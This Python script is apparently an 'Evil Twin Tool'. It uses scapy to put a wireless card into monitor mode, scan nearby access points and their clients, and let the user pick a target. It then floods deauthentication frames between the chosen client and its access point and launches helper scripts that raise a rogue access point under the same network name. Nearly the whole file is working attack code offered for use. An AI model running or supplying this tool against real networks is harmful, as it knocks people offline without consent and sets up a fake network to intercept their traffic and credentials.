import os
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Deauth

# ---- magic numbers ----------
ADDR = 0
ESSID = 0
BSSID = 1
CHANNEL = 2

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
O = '\033[33m'  # orange
C = '\033[36m'  # cyan






# ------ Global variable -----

sniffer_interface = ''
ap_interface = ''
target_mac =''
search_timeout = 15
ap_list = []
client_list = []
ssids_set = set()
start_scan = datetime.now()


def reset_interface():
    # do_command(f"dhclient -v {sniffer_interface}")
    do_command('service NetworkManager stop')
    do_command('airmon-ng check kill')

def print_msg(str, take_break: bool = True):
    print("\n############################################################ \n")
    print("\t\t " + str +"\n")
    print("############################################################ \n")
    if take_break:
        empty = input("Press Enter to continue...\n")

def do_command(str , to_print: bool = True):
    print(C)
    if to_print:
        print(C + "command: " + str + W)
    os.system(str)

def monitor_mode():
    """
    This function change interface mode to monitor by user request
    :return:
    """
    global sniffer_interface
    global ap_interface
    do_command('iwconfig')
    sniffer_interface = 'wlan0'
    user_input= input("Please type the interface name you want to put in 'monitor mode'\n"
                      "hit enter for 'wlan0'\n")
    if user_input != '':
        sniffer_interface = user_input

    do_command('ifconfig ' + sniffer_interface + ' down')
    do_command('iwconfig ' + sniffer_interface + ' mode monitor')
    do_command('ifconfig ' + sniffer_interface + ' up')


    do_command('iwconfig')
    ap_interface = 'wlan1'
    user_input = input("Please type the interface name you want to use for fake AP\n"
                       "hit enter for 'wlan1'\n")
    if user_input != '':
        ap_interface = user_input

    print(f"Fake AP will use {ap_interface}")


def managed_mode():

    do_command('ifconfig ' + sniffer_interface + ' down')
    do_command('iwconfig ' + sniffer_interface + ' mode managed')
    do_command('ifconfig ' + sniffer_interface + ' up')
    print("[**] - The interface: " + sniffer_interface + ", is now in Managed Mode. \nYou can check it here : \n")
    do_command('iwconfig')


def change_channel():
    """
    This function change the channel the interface is listening on.
    There is 14 channels so it's switch channel in range [1,14] each 0.5 seconds
    :return:
    """
    ch = 1
    now = datetime.now()
    while (now - start_scan).seconds < search_timeout:
        now = datetime.now()
        set_channel(ch)
        ch = ch % 14 + 1
        time.sleep(0.5)

def set_channel(channel: int) -> None:
    """
    Set the channel the interface is listening on.
    :param channel:  int . In range of [1,14]
    :return: None
    """
    do_command(f"iwconfig {sniffer_interface} channel {channel}")


def scan_netwroks(pkt):
    if pkt.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = pkt[Dot11].addr2
        # get the name of it
        ssid = pkt[Dot11Elt].info.decode()
        if ssid not in ssids_set:
            ssids_set.add(ssid)
            # get the channel of the AP
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel")

            ap_list.append([ssid, bssid, channel])
            print("coming AP : %s SSID: %s Channel: %d" % (bssid, ssid, channel))


def only_clients(pkt):
    global client_list
    if (pkt.addr2 == target_mac or pkt.addr3 == target_mac) and \
            pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                client_list.append(pkt.addr1)
                print("Client mac:", pkt.addr1)


# def scan_clients(rmac, addr):
def scan_clients(AP_id: int):
    global target_mac
    global start_scan
    global  search_timeout
    channel = ap_list[AP_id][CHANNEL]
    ssid =  ap_list[AP_id][BSSID]
    target_mac = ssid  # ap_mac
    addr = ap_list[AP_id][ADDR]

    search_timeout = search_timeout * 2
    start_scan = datetime.now()

    print("ch:", int(channel), end='\t')
    print("ssid:", ssid, end='\t')
    print("name:", addr)
    set_channel(int(channel))

    print("\nScanning for clients")
    #    print("\nScanning for clinets:" ,rmac, "\tessid:" , addr ,  "\nscanning time:", time, "sec\n\nscanning...\n")
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    try:
        sniff(iface=sniffer_interface, prn=only_clients, timeout=search_timeout)
    except Exception as e:
        print('Exception:' , e)
    channel_changer.join()
    print("\n----------- Client's Table ---------------------\n")
    for x in range(len(client_list)):
        print('[', x, ']', client_list[x])
    print("\n----------- FINISH SCANNING --------------------\n")
    result = input("Choose the number of client you want to attack or type 'r' for rescan: ")
    if result == 'r':
        return scan_clients(AP_id)
    elif result == 'q':
        return -1
    elif result.isnumeric():
        return result
    else:
        return -1





def APs_scanner() -> int:
    global search_timeout
    global start_scan
    user_input = input("Please enter the scanning time frame in seconds\n"
                           "hit enter for deauflt time of 15 sec\n")
    if user_input != '':
        search_timeout= int(user_input)
    start_scan = datetime.now()

    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    print("\n Scanning for networks...\n")
    try:
        sniff(iface=sniffer_interface, prn=scan_netwroks, timeout=search_timeout)
    except UnicodeDecodeError as e:
        print('Exception:' , e)
        pass
    channel_changer.join()

    num = len(ap_list)
    if num > 0:  # has available networks
        print("\n*************** APs Table ***************\n")
        for x in range(num):
            print('[', str(x), ']', ap_list[x][ADDR], ap_list[x][BSSID])

        #        print("\n--------------------------------------------\n")
        print("\n************* FINISH SCANNING *************\n")
        result = input("Please enter the number of the AP you want to attack"
                          "\nor type 'r' for rescanning\n")
        if result == 'r':
            return APs_scanner()
        elif result == 'q':
            return -1
        elif result.isnumeric():
            return int(result)
        else:
            return -1

    else:  # didn't found
        rescan = input("No networks were found. Do you want to rescan? [Y/N] \n")
        if rescan == "Y":
            return APs_scanner()
        else:
            print("#  Goodbye  #")
            return -1

def attack(client_idx: int):
    # global ap_to_attack
    print("attacking")
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC

    client_mac = client_list[client_idx]
    print("attaching client mac:", client_mac)
    # print("clinet mac to attack:", client_mac )
    # brdmac = "ff:ff:ff:ff:ff:ff"
    # pkt = RadioTap() / Dot11(addr1 = brdmac , addr2 = client_mac , addr3 = client_mac)/ Dot11Deauth()
    # sendp(pkt, iface=network_adapter , count=1000, inter = 0.2)

    for y in range(1,3):
        # sending fake packets  in two directions : AP -> client , client -> AP
        pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
        pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
        for _ in range(50):
            print("sending death packets...")
            sendp(pkt1, iface=sniffer_interface, count=20)
            sendp(pkt2, iface=sniffer_interface, count=20)
            if y % 30 == 0:
                press = input("press p to stop, otherwise any")
                if press == 'p':
                    print("#  Goodbye  #")
                    break

def death_attack(client_idx : int):
    line = f"python3 death-attack.py {sniffer_interface} {target_mac} {client_list[client_idx]}"
    gnome = f'gnome-terminal -- sh -c "{line}"'
    do_command(gnome)


def ap_up(network_name  : str):
    global ap_interface
    do_command("python3 fake_ap.py " + ap_interface + " " + network_name)



if __name__ == "__main__":
    print(W)
    if os.geteuid():
        sys.exit('[**] Please run as root')

    print_msg("Welcome To Evil Twin Tool")

    # step 1 - prepare the newtwork adapter
    print_msg("Step 1 - monitor mode")
    reset_interface()
    monitor_mode()
    print('ap_interface' , ap_interface)
    try:
        # step 2 - scan the the networks around
        print_msg("Step2 - AP's scanner")
        ap_id = APs_scanner()
        network_name = ap_list[ap_id][ADDR]
        print("ap_id:" , ap_id, "\tnetwork name" , network_name )
        print()
        if ap_id >=0:
            print_msg("Step 3 - Find Client")
            client_id = int(scan_clients(ap_id))
            print("client_id", client_id)

            if client_id >= 0:
                print_msg("Step 4 - Death Attack on\n\t\t\t" + client_list[client_id])
                # attack
                # line = f"python3 death-attack.py {sniffer_interface} {target_mac} {client_list[client_id]}"
                # gnome = f'gnome-terminal -- sh -c "{line}"'
                # do_command(gnome)
                death_attack(client_id)

                print_msg("Step 5 - Fake AP ")
                ap_up(network_name)


            else:
                # step 5 - Back to managed mode
                print_msg("Error - managed mode", False)
                managed_mode()
                reset_interface()
        else:
            # step 5 - Back to managed mode
            print_msg("Error - managed mode", False)
            managed_mode()



    except Exception as e:
        # step 3 - Back to managed mode
        print_msg("Exception: back to managed mode", False)
        managed_mode()

        print(R)
        print("-------------------------------")
        print(W)
        print(traceback.format_exc())
        print(R)
        print("-------------------------------")
        print(W)

    else:
        pass


